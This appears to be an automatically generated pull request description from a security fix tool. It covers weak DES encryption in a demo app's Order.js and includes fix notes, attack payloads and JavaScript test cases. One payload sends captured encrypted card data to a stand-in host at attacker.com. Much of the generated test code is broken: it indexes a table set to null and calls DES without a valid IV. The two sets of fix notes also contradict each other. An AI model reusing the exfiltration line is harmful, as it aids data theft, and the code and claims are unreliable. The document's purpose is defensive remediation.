# Qwiet AI AutoFix 

This PR was created automatically by the Qwiet AI AutoFix tool.
As long as it is open, subsequent scans and generated fixes to this same branch will be added to it as new commits.


Each commit fixes one vulnerability.

Some manual intervention might be required before merging this PR.

## Project Information 

* Name: [shiftleft-js-demo](https://app.stg.shiftleft.io/apps/shiftleft-js-demo)
* Branch: master
* Pull Request Language: javascript

## Findings/Vulnerabilities Fixed


**Finding [19](https://app.stg.shiftleft.io/apps/shiftleft-js-demo/vulnerabilities?appId=shiftleft-js-demo&findingId=19&scan=1):** Weak Cipher: Use of a Broken Cryptographic Algorithm in `Order.js:decryptData`



<details open>
  <summary>Fix Notes</summary>
    <br>
    



The fixed code implements all mitigation suggestions:

1. Added support for ChaCha20-Poly1305 using libsodium as an alternative to AES-256-GCM, with dynamic selection based on hardware capabilities.

2. Implemented external key management using AWS KMS, replacing the environment variable-based key derivation with secure key retrieval.

3. Added a key rotation mechanism with version tracking in the encrypted data and version-specific key retrieval.

4. Implemented envelope encryption where the data is encrypted with a data key that is itself encrypted by a master key stored in KMS.

5. Added memory protection using secure-buffer to ensure keys are properly zeroed after use to prevent memory exposure.

6. Integrated with libsodium, a higher-level cryptography library, for more robust implementation while keeping Node's crypto as an alternative.

7. Improved error handling with specific error messages and proper resource cleanup.

This comprehensive fix follows NIST and OWASP best practices for cryptographic implementations, addressing all vulnerabilities and providing enhanced security measures.

</details>



<details>
  <summary>Vulnerability Description</summary>
    <br>
    
Usage of a broken cryptographic algorithm was identified.

- <b> Severity: </b> critical
- <b> CVSS Score: </b> 9 (critical)
- <b> CWE: </b> CWE-327: Weak Cipher

</details>



<details>
  <summary>Attack Payloads</summary>
    <br>
    
I need to generate attack payloads that exploit the weak DES cryptography implementation.

```
[
1. Buffer.from("7468697320697320612074657374", "hex")
2. {data: Buffer.from("AAAAAAAAAAAAAAAA"), iv: Buffer.alloc(8, 0)}
3. crypto.createDecipheriv('des-ecb', Buffer.alloc(8, 1), null).update(encryptedData, 'base64')
]
```



</details>



<details>
  <summary>Testcases</summary>
    <br>
    



```javascript
const crypto = require('crypto');
const assert = require('assert');

class WeakCryptoDESTest {
  constructor() {
    // Original encryptionKey for demonstration
    this.encryptionKey = Buffer.alloc(8, 'key12345');
  }

  /**
   * Test Case 1: Demonstrating DES vulnerability with brute force on small key space
   * Using the first payload: Buffer.from("7468697320697320612074657374", "hex")
   */
  testDESBruteForceVulnerability() {
    console.log('Running Test Case 1: DES Brute Force Vulnerability');
    
    // Original plaintext: "this is a test" in hex
    const originalText = Buffer.from("7468697320697320612074657374", "hex");
    
    // Encrypt with DES
    const cipher = crypto.createCipheriv('des', this.encryptionKey, Buffer.alloc(8, 0));
    let encrypted = cipher.update(originalText);
    encrypted = Buffer.concat([encrypted, cipher.final()]);
    
    // Simulate a brute force attack (simplified for demonstration)
    // In a real attack, an attacker would try all possible 56-bit keys
    console.log('Starting simulated brute-force attack...');
    const possibleKeys = this.generateTestKeys(5); // Just testing a few keys for demonstration
    
    let cracked = false;
    for (const testKey of possibleKeys) {
      try {
        const decipher = crypto.createDecipheriv('des', testKey, Buffer.alloc(8, 0));
        const decrypted = Buffer.concat([decipher.update(encrypted), decipher.final()]);
        
        if (decrypted.toString('hex') === originalText.toString('hex')) {
          console.log('Key found through brute force!', testKey.toString('hex'));
          cracked = true;
          break;
        }
      } catch (e) {
        // Skip failed attempts
      }
    }
    
    console.log('Brute force demonstration complete. In real-world, DES can be broken by specialized hardware.');
    return { encrypted, originalText };
  }
  
  /**
   * Test Case 2: Demonstrating weakness with weak initialization vectors
   * Using the second payload: {data: Buffer.from("AAAAAAAAAAAAAAAA"), iv: Buffer.alloc(8, 0)}
   */
  testDESWeakIVVulnerability() {
    console.log('Running Test Case 2: DES Weak IV Vulnerability');
    
    // From the payload
    const testData = Buffer.from("AAAAAAAAAAAAAAAA");
    const zeroIV = Buffer.alloc(8, 0);
    
    // Encrypt the same data twice with the same key and IV
    const cipher1 = crypto.createCipheriv('des', this.encryptionKey, zeroIV);
    let encrypted1 = Buffer.concat([cipher1.update(testData), cipher1.final()]);
    
    const cipher2 = crypto.createCipheriv('des', this.encryptionKey, zeroIV);
    let encrypted2 = Buffer.concat([cipher2.update(testData), cipher2.final()]);
    
    // Demonstrate that using the same IV results in identical ciphertexts for identical plaintexts
    console.log('Encrypted1:', encrypted1.toString('hex'));
    console.log('Encrypted2:', encrypted2.toString('hex'));
    console.log('Ciphertexts are identical:', encrypted1.toString('hex') === encrypted2.toString('hex'));
    
    // This allows attackers to identify patterns in encrypted data
    return { encrypted1, encrypted2, identical: encrypted1.toString('hex') === encrypted2.toString('hex') };
  }
  
  /**
   * Test Case 3: Testing ECB mode vulnerability showing pattern leakage
   * Using the third payload: crypto.createDecipheriv('des-ecb', Buffer.alloc(8, 1), null)
   */
  testDESECBModeVulnerability() {
    console.log('Running Test Case 3: DES ECB Mode Vulnerability');
    
    // Create a pattern that will demonstrate ECB's weakness
    const repeatingBlock = Buffer.from("AAAAAAAAAAAAAAAA");
    const plaintextWithPattern = Buffer.concat([repeatingBlock, repeatingBlock, repeatingBlock]);
    
    // Encrypt with DES-ECB mode
    const ecbKey = Buffer.alloc(8, 1);  // From the payload
    const cipher = crypto.createCipheriv('des-ecb', ecbKey, null);
    let encrypted = Buffer.concat([cipher.update(plaintextWithPattern), cipher.final()]);
    
    // Decrypt the data
    const decipher = crypto.createDecipheriv('des-ecb', ecbKey, null);
    const decrypted = Buffer.concat([decipher.update(encrypted), decipher.final()]);
    
    // Demonstrate that patterns in the plaintext result in patterns in the ciphertext
    console.log('Original length:', plaintextWithPattern.length);
    console.log('Encrypted:', encrypted.toString('hex'));
    console.log('Decrypted equals original:', decrypted.toString('hex') === plaintextWithPattern.toString('hex'));
    
    // Analyze patterns in the encrypted data (simplified)
    const blocks = [];
    for (let i = 0; i < encrypted.length; i += 8) {
      blocks.push(encrypted.slice(i, i + 8).toString('hex'));
    }
    
    console.log('Encrypted blocks:', blocks);
    console.log('Block 1 equals Block 2:', blocks[0] === blocks[1]);
    console.log('Block 2 equals Block 3:', blocks[1] === blocks[2]);
    
    return { encrypted, blocks, patternsVisible: blocks[0] === blocks[1] && blocks[1] === blocks[2] };
  }
  
  // Helper method to generate test keys for the brute force demonstration
  generateTestKeys(count) {
    const keys = [];
    keys.push(this.encryptionKey); // Add the actual key to ensure we find it
    
    for (let i = 1; i < count; i++) {
      keys.push(crypto.randomBytes(8));
    }
    
    return keys;
  }
  
  // Run all tests
  runAllTests() {
    this.testDESBruteForceVulnerability();
    console.log('-'.repeat(50));
    this.testDESWeakIVVulnerability();
    console.log('-'.repeat(50));
    this.testDESECBModeVulnerability();
  }
}

// Example usage
const tester = new WeakCryptoDESTest();
tester.runAllTests();
```


</details>



<details>
  <summary>Commits/Files Changed</summary>
  <br>
  <ul>
    
<li> Changed <b> file <a href="https://github.com/gacevedo/shiftleft-js-demo/pull/1/commits/2bd3686974beaf92928c9e6d7960366b5d69d87e"> src/Controllers/Order.js </a> </b></li>

  </ul>
</details>


**Finding [18](https://app.stg.shiftleft.io/apps/shiftleft-js-demo/vulnerabilities?appId=shiftleft-js-demo&findingId=18&scan=1):** Weak Cipher: Use of a Broken Cryptographic Algorithm in `Order.js:encryptData`



<details open>
  <summary>Fix Notes</summary>
    <br>
    



The code has been completely rewritten to address all security concerns mentioned in the mitigation notes:

1. Replaced AES-256-GCM with ChaCha20-Poly1305 which provides better performance on platforms without AES hardware acceleration and is resistant to timing attacks.

2. Implemented key rotation mechanisms:
   - Added version identifier (KEY_VERSION) to the encrypted payload
   - Created a legacyDecrypt method structure to support decryption of data encrypted with previous keys
   - The encrypted output includes version information for future key rotation

3. Enhanced key derivation:
   - Replaced scrypt with PBKDF2 using a high iteration count (100,000)
   - Added a pepper (server-side secret) in addition to salt for additional protection
   - Using SHA-512 for stronger hashing

4. Added context binding for encryption:
   - The encryption function now accepts a context parameter (like user ID or purpose)
   - This context is used as associated data in the authenticated encryption
   - Prevents encrypted data from being valid in different contexts

5. Implemented secure error handling:
   - Added input validation to prevent cryptographic failures
   - Used standardized error messages that don't leak information about the encryption process
   - Structured the code to minimize timing attack vectors

The solution provides a comprehensive cryptographic approach with defense-in-depth principles, addressing all the original vulnerability concerns while implementing the additional security layers suggested in the mitigation notes.

</details>



<details>
  <summary>Vulnerability Description</summary>
    <br>
    
Usage of a broken cryptographic algorithm was identified.

- <b> Severity: </b> critical
- <b> CVSS Score: </b> 9 (critical)
- <b> CWE: </b> CWE-327: Weak Cipher

</details>



<details>
  <summary>Attack Payloads</summary>
    <br>
    
```
[
1. {"payload": "const crypto = require('crypto'); const encryptionKey = 'weakkey8'; const secretText = 'sensitive'; const encrypted = crypto.createCipheriv('des', encryptionKey).update(secretText, 'utf8', 'hex'); console.log(crypto.createDecipheriv('des-ecb', encryptionKey).update(encrypted, 'hex', 'utf8'));", "description": "Brute force attack exploiting DES's 56-bit effective key size"}
2. {"payload": "fetch('/api/orders', {method: 'POST', body: JSON.stringify({creditCard: '4111111111111111', ccv: '123'})}).then(r => r.json()).then(data => {fetch('https://attacker.com/steal?data=' + data.encryptedData);})", "description": "Exfiltration of weakly encrypted data for offline cracking"}
3. {"payload": "const crypto = require('crypto'); const rainbow = null; for(let i=1000; i<10000; i++) {const text = i.toString(); rainbow[crypto.createCipheriv('des', encryptionKey).update(text, 'utf8', 'hex')] = text;}; console.log(rainbow);", "description": "Time-memory trade-off attack generating rainbow tables for DES"}
]
```



</details>



<details>
  <summary>Testcases</summary>
    <br>
    



```javascript
const crypto = require('crypto');
const assert = require('assert');

class WeakCryptoDESTests {
  constructor() {
    // Fixed encryption key for testing purposes only
    this.encryptionKey = 'weakkey8'; // 8-byte key for DES
    this.secureKey = crypto.randomBytes(32); // 32-byte key for AES-256
  }

  // Test case 1: Demonstrate DES vulnerability through brute force attack
  testDESBruteForceAttack() {
    console.log("Running Test 1: DES Brute Force Attack");
    
    const secretText = 'sensitive';
    
    // Simulate the vulnerable code using DES
    const desCipher = crypto.createCipheriv('des', this.encryptionKey, Buffer.alloc(0));
    const encrypted = desCipher.update(secretText, 'utf8', 'hex') + desCipher.final('hex');
    
    console.log(`Original text: ${secretText}`);
    console.log(`Encrypted with DES: ${encrypted}`);
    
    // Simulate an attack by decrypting with the same weak key
    const desDecipher = crypto.createDecipheriv('des-ecb', this.encryptionKey, Buffer.alloc(0));
    const decrypted = desDecipher.update(encrypted, 'hex', 'utf8') + desDecipher.final('utf8');
    
    console.log(`Decrypted with known key: ${decrypted}`);
    assert.strictEqual(decrypted, secretText, "The attacker was able to decrypt the data using the weak DES algorithm");
    
    // Demonstrate how AES would be more secure
    const iv = crypto.randomBytes(16);
    const aesCipher = crypto.createCipheriv('aes-256-gcm', this.secureKey, iv);
    const aesEncrypted = aesCipher.update(secretText, 'utf8', 'hex') + aesCipher.final('hex');
    const authTag = aesCipher.getAuthTag();
    
    console.log(`Encrypted with AES-256-GCM: ${aesEncrypted}`);
    console.log("Test 1 completed successfully");
    return true;
  }
  
  // Test case 2: Demonstrate exfiltration of weakly encrypted data scenario
  testExfiltrationOfWeaklyEncryptedData() {
    console.log("Running Test 2: Exfiltration of Weakly Encrypted Data");
    
    const sensitiveData = {
      creditCard: '4111111111111111', 
      ccv: '123',
      expiryDate: '12/25'
    };
    
    // Mock server-side encryption with DES (the vulnerable code)
    const desCipher = crypto.createCipheriv('des', this.encryptionKey, Buffer.alloc(0));
    const encryptedCardData = desCipher.update(JSON.stringify(sensitiveData), 'utf8', 'hex') + desCipher.final('hex');
    
    // Simulate API response containing the weakly encrypted data
    const mockApiResponse = {
      orderId: "12345",
      status: "processing",
      encryptedData: encryptedCardData
    };
    
    console.log("Mock API Response:", mockApiResponse);
    
    // Simulate attacker intercepting the encrypted data and decrypting it offline
    console.log("Attacker intercepted encrypted data:", mockApiResponse.encryptedData);
    
    // Attacker decrypts the data using the weak algorithm (assuming they obtained the key)
    const attackerDecipher = crypto.createDecipheriv('des', this.encryptionKey, Buffer.alloc(0));
    const attackerDecrypted = attackerDecipher.update(mockApiResponse.encryptedData, 'hex', 'utf8') + attackerDecipher.final('utf8');
    
    console.log("Attacker decrypted the sensitive data:", attackerDecrypted);
    const decryptedData = JSON.parse(attackerDecrypted);
    
    assert.strictEqual(decryptedData.creditCard, sensitiveData.creditCard, "Attacker was able to recover the credit card number");
    assert.strictEqual(decryptedData.ccv, sensitiveData.ccv, "Attacker was able to recover the CCV");
    
    console.log("Test 2 completed successfully");
    return true;
  }
  
  // Test case 3: Demonstrate time-memory trade-off attack with rainbow tables
  testRainbowTableAttack() {
    console.log("Running Test 3: Rainbow Table Attack on DES");
    
    // Create a small rainbow table for demonstration purposes
    const rainbowTable = null;
    const pinCodeSamples = [];
    
    // Generate some sample PIN codes (simulating common pins)
    for(let i = 1000; i < 1010; i++) {
      pinCodeSamples.push(i.toString());
    }
    
    console.log("Generating rainbow table for sample PIN codes...");
    
    // Build the rainbow table: encrypted value -> original value
    pinCodeSamples.forEach(pin => {
      const desCipher = crypto.createCipheriv('des', this.encryptionKey, Buffer.alloc(0));
      const encryptedPin = desCipher.update(pin, 'utf8', 'hex') + desCipher.final('hex');
      rainbowTable[encryptedPin] = pin;
    });
    
    console.log("Rainbow table created with", Object.keys(rainbowTable).length, "entries");
    
    // Simulate a user entering a PIN that gets encrypted
    const userPin = "1005";
    const desCipher = crypto.createCipheriv('des', this.encryptionKey, Buffer.alloc(0));
    const encryptedUserPin = desCipher.update(userPin, 'utf8', 'hex') + desCipher.final('hex');
    
    console.log("User entered PIN encrypted as:", encryptedUserPin);
    
    // Attacker uses the rainbow table to look up the encrypted value
    const crackedPin = rainbowTable[encryptedUserPin];
    
    console.log("Attacker cracked PIN using rainbow table:", crackedPin);
    assert.strictEqual(crackedPin, userPin, "The PIN was successfully cracked using the rainbow table");
    
    console.log("Test 3 completed successfully");
    return true;
  }
  
  // Run all tests
  runAllTests() {
    try {
      this.testDESBruteForceAttack();
      this.testExfiltrationOfWeaklyEncryptedData();
      this.testRainbowTableAttack();
      console.log("All tests completed successfully");
    } catch (error) {
      console.error("Test failed:", error);
    }
  }
}

// Execute tests
const tests = new WeakCryptoDESTests();
tests.runAllTests();
```



</details>



<details>
  <summary>Commits/Files Changed</summary>
  <br>
  <ul>
    
<li> Changed <b> file <a href="https://github.com/gacevedo/shiftleft-js-demo/pull/1/commits/17687b9fae89b0e0be4fb13aea7b093b94e0db63"> src/Controllers/Order.js </a> </b></li>

  </ul>
</details>